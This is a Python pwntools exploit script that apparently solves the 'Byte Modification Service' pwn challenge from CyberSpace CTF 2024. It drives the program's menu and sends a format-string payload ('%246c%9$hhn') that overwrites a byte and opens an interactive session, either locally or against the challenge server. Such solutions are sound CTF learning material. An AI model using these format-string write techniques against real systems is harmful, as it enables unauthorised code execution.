#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/CyberSpace CTF 2024/pwn/Byte Modification Service/chall')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    payload = b'%246c%9$hhn'

    r.sendlineafter(b'use?\n', b'7')
    r.sendlineafter(b'Index?\n', b'0')
    r.sendlineafter(b'with?\n', str(0x61).encode())
    r.sendlineafter(b'service.\n', payload)
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('byte-modification-service.challs.csc.tf', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
